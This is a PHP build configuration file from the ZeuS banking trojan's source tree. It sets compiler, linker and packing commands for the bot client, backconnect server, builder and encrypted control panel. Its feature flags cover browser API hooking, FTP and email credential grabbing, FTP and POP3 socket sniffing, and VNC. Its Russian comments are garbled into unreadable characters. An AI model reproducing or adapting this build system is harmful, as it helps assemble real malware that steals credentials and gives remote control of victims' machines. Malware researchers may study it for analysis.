<?php
///////////////////////////////////////////////////////////////////////////////////////////////////
// ������������.
///////////////////////////////////////////////////////////////////////////////////////////////////

$configDir = NULL;
$config = array
(
  'debug'                => -1, //���������� ���������� ����������.
  'manual'               => -1, //���� ������������.

  'nspr4'                => -1, //�������� nspr4.dll
  'wininet'              => -1, //�������� wininet.dll
  'software_ftp'         => -1, //������� FTP-��������.
  'software_email'       => -1, //���� email'�� � ��������.

  'socket_ftp'           => -1, //������ ������� FTP.
  'socket_pop3'          => -1, //������ ������� POP3.

  'vnc'                  => -1, //VNC.
  'jabber_notifier'      => -1, //����������� ��� Jabber.

  'client_platforms'     => -1, //������ �������� ��� client.
  'server_platforms'     => -1, //������ �������� ��� server.
  'bcserver_platforms'   => -1, //������ �������� ��� bcserver.
  'builder_platforms'    => -1, //������ �������� ��� builder.
  'buildtools_platforms' => -1, //������ �������� ��� buildtools.
);

loadGlobalConfig();
define('BO_NAME',           'ZeuS');                                        //���
define('BO_CLIENT_VERSION', trim($config['global']['versions']['client'])); //������� ������
define('BO_BUILDTIME',      gmdate('H:i:s d.m.Y', time()).' GMT');          //����� ������

//���������� �����������.
//$dir['vcdlls']          = 'C:\Program Files\Microsoft Visual Studio 10.0\Common7\IDE';
//$dir['vc']              = 'C:\Program Files\Microsoft Visual Studio 10.0\VC';
//$dir['sdk']             = 'C:\Program Files\Microsoft SDKs\Windows\v7.0A';

$dir['vcdlls']          = 'C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\IDE';
$dir['vc']              = 'C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC';
$dir['sdk']             = 'C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A';
$dir['kits']             = 'C:\Program Files (x86)\Windows Kits\10';
//C:\Program Files (x86)\Windows Kits\10\Include\10.0.10150.0\ucrt \Include
$dir['vcbin']['win32']  = $dir['vc'].'\bin';
$dir['vcbin']['win64']  = $dir['vc'].'\bin\amd64';
$dir['sdkbin']['win32'] = $dir['sdk'].'\bin';
$dir['sdkbin']['win64'] = $dir['sdk'].'\bin\x64';

putenv('PATH=%PATH%;'.$dir['vcdlls']); //��� ��������� �������� ������ DLL.

//��������� ����������.
$dir['project'] = dirname(getcwd()); //������� �����.
$dir['bin']     = $dir['project'].'\bin';
$dir['docs']    = $dir['project'].'\docs';
$dir['configs'] = $dir['project'].'\configs';
$dir['temp']    = $dir['project'].'\temp';
$dir['geobase'] = $dir['project'].'\geobase';
$dir['moutput'] = $dir['project'].'\output_all';

//���������� ������.
$dir['output'][0]                 = $dir['project'].'\output';
$dir['output']['client']          = $dir['output'][0];
$dir['output']['server']          = $dir['output'][0].'\server';
$dir['output']['bcserver']        = $dir['output'][0].'\server';
$dir['output']['builder']         = $dir['output'][0].'\builder';
$dir['output']['other']           = $dir['output'][0].'\other';
$dir['output']['buildtools']      = $dir['output'][0];

//���������� ��������� ����.
$dir['source'][0]                 = $dir['project'].'\source';
$dir['source']['client']          = $dir['source'][0].'\client';
$dir['source']['server']          = $dir['source'][0].'\server';
$dir['source']['bcserver']        = $dir['source'][0].'\bcserver';
$dir['source']['builder']         = $dir['source'][0].'\builder';
$dir['source']['common']          = $dir['source'][0].'\common';
$dir['source']['other']           = $dir['source'][0].'\other';
$dir['source']['buildtools']      = $dir['source'][0].'\buildtools';

//����� ����������
$commandLineOptions['client']['win32'] = array
(
  'name'        => 'client32.bin',
  'subsys'      => 'WINDOWS',
  'cpp_options' => '/D "SECURITY_WIN32" /D "_USING_V110_SDK71_" /I "'.$dir['source']['common'].'"',
  'lnk_options' => '/ENTRY:Core::_entryPoint /MERGE:.rdata=.text /FIXED:NO msvcrt.lib  vcruntime.lib ucrt.lib kernel32.lib user32.lib advapi32.lib shlwapi.lib shell32.lib secur32.lib psapi.lib ole32.lib gdi32.lib comctl32.lib ws2_32.lib crypt32.lib wininet.lib lde32.lib msxml2.lib oleaut32.lib netapi32.lib userenv.lib comdlg32.lib mpr.lib uuid.lib'
);

$commandLineOptions['bcserver']['win32'] = array
(
  'name'        => 'zsbcs.exe',
  'subsys'      => 'CONSOLE',
  'cpp_options' => '/D "_USING_V110_SDK71_" ',
  'lnk_options' => '/MERGE:.rdata=.text kernel32.lib advapi32.lib shlwapi.lib shell32.lib crypt32.lib ws2_32.lib user32.lib'
);

$commandLineOptions['builder']['win32']  = array
(
  'name'        => 'zsb.exe', 
  'subsys'      => 'WINDOWS',
  'cpp_options' => '/D "_USING_V110_SDK71_" ',
  'lnk_options' => 'kernel32.lib user32.lib advapi32.lib shlwapi.lib shell32.lib gdi32.lib comctl32.lib comdlg32.lib ole32.lib psapi.lib lde32.lib',
  'res_options' => ''
);

$commandLineOptions['server']['php'] = array
(
  'include_files'    => array('*.htaccess', '*.php', '*.css', '*.js', '*.html', '*.gif', '*.png'),
  'exclude_files'    => array('system\config.php'),
  'php_files'        => array('*.php'),
  'js_files'         => array('*.js'),
  'exclude_pp_files' => array('theme\*', 'system\fsarc.php', 'index.php', 'system\index.php')
);

$commandLineOptions['buildtools']['win64'] = array
(
  'name'        => 'bt.exe',
  'subsys'      => 'CONSOLE',
  'cpp_options' => '/D "_USING_V110_SDK71_" ',
  'lnk_options' => 'kernel32.lib shlwapi.lib shell32.lib user32.lib advapi32.lib'
);

//������� ��� ������ include, lib.
$dir['include'] = array
(

    'C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\include',
    'C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\atlmfc\include',
    'C:\Program Files (x86)\Windows Kits\10\Include\10.0.10240.0\ucrt',
    'C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\include',
    $dir['project'].'\include'
);


$dir['lib']['win32'] = array
(
    'C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\lib',
    'C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\lib',
    'C:\Program Files (x86)\Windows Kits\10\lib\10.0.10240.0\ucrt\x86',
    $dir['project'].'\lib\x32'
);

$dir['lib']['win64'] = array($dir['vc'].'\lib\amd64', $dir['sdk'].'\lib\x64', $dir['project'].'\lib\x64');

//��������� ������.?
$commandLinePart['cpp']  = '/O1 /Ob2 /Oi- /Os /Oy '.                                                                                                            //Optimization
                           '/EHa /fp:fast /fp:except- /Gr /GF /GL /GR- /Gy '.                                                                                   //Code Generation
                           '/Fo"%TEMP%/" '.                                                                                                                     //Output Files
                           '/GS- '.                                                                                                                             //Debugging
                           '/D "SECURITY_WIN32" /D "WIN32_LEAN_AND_MEAN" /D "OEMRESOURCE" /D "NDEBUG" /D "WIN32" /D "_WINDOWS" /D "_UNICODE"  /D "UNICODE" /X '. //Preprocessor
                           '/I"'.implode('" /I"', $dir['include']).'" '.                                                                                        //Includes
                           '/vmb /vms /Zl '.                                                                                                                    //Language
                           '/c /errorReport:none /MP4 /nologo /W2 /WL '.                                                                                        //Miscellaneous
                           '%OPTIONS% %SOURCE%';

$commandLinePart['link'] =  '/ENTRY:entryPoint /MERGE:code=.text /errorReport:none /FIXED /INCREMENTAL:NO /NXCOMPAT /LTCG'.
                            ' /MAP:"%MAPFILE%" /MAPINFO:EXPORTS /NODEFAULTLIB /NOLOGO /OPT:REF /OPT:ICF /LARGEADDRESSAWARE:NO'.
                            ' /DYNAMICBASE:NO /OUT:"%OUTPUT%" /MANIFESTUAC:NO /SAFESEH:NO /SUBSYSTEM:%SUBSYS% '.
                            ' /VERSION:1.0 /WX %OPTIONS% %SOURCE%';


$commandLinePart['res']  = '/D "_UNICODE"  /D "UNICODE" /FO"%OUTPUT%" %OPTIONS% "%SOURCE%"';

//�����������/�������.?
$commandLine['cpp']['win32'] = "call \"{$dir['vcbin']['win32']}\\cl.exe\" /arch:SSE {$commandLinePart['cpp']}";
$commandLine['cpp']['win64'] = "call \"{$dir['vcbin']['win64']}\\cl.exe\" /favor:blend {$commandLinePart['cpp']}";

$commandLine['fasm']['win32'] = "call \"{$dir['project']}\\bin\\fasm.exe\" \"%SOURCE%\" \"%OUTPUT%\"";
$commandLine['fasm']['win64'] = $commandLine['fasm']['win32'];

$commandLine['res']['win64'] = "call \"{$dir['sdkbin']['win64']}\\rc.exe\" /I\"".implode('" /I"', $dir['include']).'" '.$commandLinePart['res'];
$commandLine['res']['win32'] = "call \"{$dir['sdkbin']['win32']}\\rc.exe\" /I\"".implode('" /I"', $dir['include']).'" '.$commandLinePart['res'];

$commandLine['link']['win64'] = "call \"{$dir['vcbin']['win64']}\\link.exe\" /MACHINE:X64 /LIBPATH:\"".implode('" /LIBPATH:"', $dir['lib']['win64']).'" '.$commandLinePart['link'];
$commandLine['link']['win32'] = "call \"{$dir['vcbin']['win32']}\\link.exe\" /MACHINE:X86 /LIBPATH:\"".implode('" /LIBPATH:"', $dir['lib']['win32']).'" '.$commandLinePart['link'];

//����������.
$commandLine['protect']['php']   = "call \"{$dir['project']}\\bin\\zendenc5.exe\" --short-tags on --no-header --use-crypto --silent --include-ext js \"%SOURCE%\" \"%OUTPUT%\"";

//����������.
$commandLine['pack']['win64'] = NULL;
//$commandLine['pack']['win32'] = "call \"{$dir['project']}\\bin\\upx.exe\" -9 -f \"%SOURCE%\"";
$commandLine['pack']['dir']   = "call \"{$dir['project']}\\bin\\7z.exe\" a -t7z -mx=9 -ms=on -mf=on -mhc=on -mhe=on -mmt=on \"-p%PASS%\" -r -ssw -y -- \"%OUTPUT%\" \"%SOURCE%\"";
$commandLine['pack']['file']  = "call \"{$dir['project']}\\bin\\7z.exe\" a -t7z -mx=9 -ms=on -mf=on -mhc=on -mhe=on -mmt=on \"-p%PASS%\" -ssw -y -- \"%OUTPUT%\" \"%SOURCE%\"";

//������ �����������.
$commandLine['buildtools']['ror13']           = "call \"{$dir['project']}\\bin\\bt.exe\" ror13 -nologo \"-is:%STRING%\"";
$commandLine['buildtools']['pedatadirectory'] = "call \"{$dir['project']}\\bin\\bt.exe\" peinfo -nologo \"-file:%FILE%\" \"-dd:%INDEX%\"";
$commandLine['buildtools']['pepatch']         = "call \"{$dir['project']}\\bin\\bt.exe\" peinfo -nologo \"-file:%FILE%\" -va \"-pdw:%VA%,%DWORD%\"";
?>